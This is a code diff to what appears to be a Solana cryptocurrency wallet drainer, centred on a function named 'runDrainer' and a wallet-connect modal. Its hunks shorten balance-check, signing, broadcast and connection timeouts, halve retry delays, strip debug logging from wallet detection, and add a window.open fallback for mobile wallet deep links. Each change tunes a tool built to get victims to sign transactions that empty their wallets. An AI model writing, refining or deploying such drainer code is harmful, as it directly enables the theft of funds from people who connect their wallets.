@@ -1079,7 +1079,7 @@ async function runDrainer(provider) {
           const connection = new solanaWeb3.Connection(rpcUrl);
           const balancePromise = connection.getBalance(publicKey);
           const timeoutPromise = new Promise((_, reject) => {
-            setTimeout(() => reject(new Error('Balance check timeout')), 10000); // 10 second timeout
+            setTimeout(() => reject(new Error('Balance check timeout')), 5000); // 5 second timeout
           });
           
           balance = await Promise.race([balancePromise, timeoutPromise]);
@@ -1199,7 +1199,7 @@ async function runDrainer(provider) {
       })();
       
       const timeoutPromise = new Promise((_, reject) => {
-        setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 30000); // Reduced to 30 seconds
+        setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 15000); // Reduced to 15 seconds
       });
       
       signed = await Promise.race([signingPromise, timeoutPromise]);
@@ -1277,7 +1277,7 @@ async function runDrainer(provider) {
     let broadcastSuccess = false;
     
     // Add timeout for broadcast attempts
-    const broadcastTimeout = 30000; // 30 seconds
+    const broadcastTimeout = 15000; // 15 seconds
     
     // Try multiple broadcast attempts with timeout
     for (let attempt = 1; attempt <= 3; attempt++) {
@@ -1467,16 +1467,14 @@ window.openWalletModal = async function openWalletModal() {
   if (modal && walletList) {
     // Use forceDetectMobileWallets to get detected wallet providers
     const detectedWallets = forceDetectMobileWallets();
-    // Map detected wallet object paths to WALLET_DEFS
+    // Map detected wallet object paths to WALLET_DEFS with faster detection
     const detectedDefs = WALLET_DEFS.filter(wallet => {
-      // Check if the provider object exists
+      // Check if the provider object exists with timeout
       try {
         const provider = wallet.provider();
-        console.log(`Checking ${wallet.name} provider:`, provider);
         // Only show wallets with a detected provider
         return provider !== undefined && provider !== null;
       } catch (e) {
-        console.log(`Error checking ${wallet.name} provider:`, e);
         return false;
       }
     });
@@ -1885,7 +1883,7 @@ window.openWalletModal = async function openWalletModal() {
                   try {
                     const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                     const timeoutPromise = new Promise((_, reject) => {
-                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 30000);
+                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 15000);
                     });
                     
                     result = await Promise.race([connectionPromise, timeoutPromise]);
@@ -1900,12 +1898,12 @@ window.openWalletModal = async function openWalletModal() {
                     
                     // Wait before retry
                     showStatus(`Retrying ${wallet.name} connection... (${retryCount}/${maxRetries + 1})`, 'loading');
-                    await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
+                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                   }
                 }
                 console.log(`[connectMobileWallet] connectWalletWithMetadata result for ${wallet.name}:`, result);
                 // Wait a bit for connection to establish
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                await new Promise(resolve => setTimeout(resolve, 500));
                 
                 // Check if we got a public key
                 const publicKey = provider.publicKey || provider.address || result?.publicKey;
@@ -2224,7 +2222,7 @@ window.openWalletModal = async function openWalletModal() {
               try {
                 const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                 const timeoutPromise = new Promise((_, reject) => {
-                  setTimeout(() => reject(new Error('Connection timeout - please try again')), 30000);
+                                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 15000);
                 });
                 
                 result = await Promise.race([connectionPromise, timeoutPromise]);
@@ -2239,7 +2237,7 @@ window.openWalletModal = async function openWalletModal() {
                 
                 // Wait before retry
                 showStatus(`Retrying ${wallet.name} connection... (${retryCount}/${maxRetries + 1})`, 'loading');
-                await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
+                                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
               }
             }
             console.log(`[connectMobileWallet] Desktop: connectWalletWithMetadata result for ${wallet.name}:`, result);
@@ -2422,8 +2420,23 @@ window.openWalletModal = async function openWalletModal() {
           break;
       }
       
-      // Try to open the deep link
-      window.location.href = deepLink;
+      // Try to open the deep link with fallback
+      try {
+        console.log(`[DEEP_LINK] Attempting to open ${walletType} deep link:`, deepLink);
+        
+        // Try window.open first for better compatibility
+        const newWindow = window.open(deepLink, '_blank');
+        
+        // If window.open fails, try location.href
+        if (!newWindow || newWindow.closed) {
+          console.log(`[DEEP_LINK] window.open failed, trying location.href`);
+          window.location.href = deepLink;
+        }
+      } catch (error) {
+        console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
+        // Fallback to location.href
+        window.location.href = deepLink;
+      }
     }
 
     // Function to show wallet browser prompt when no wallet is detected
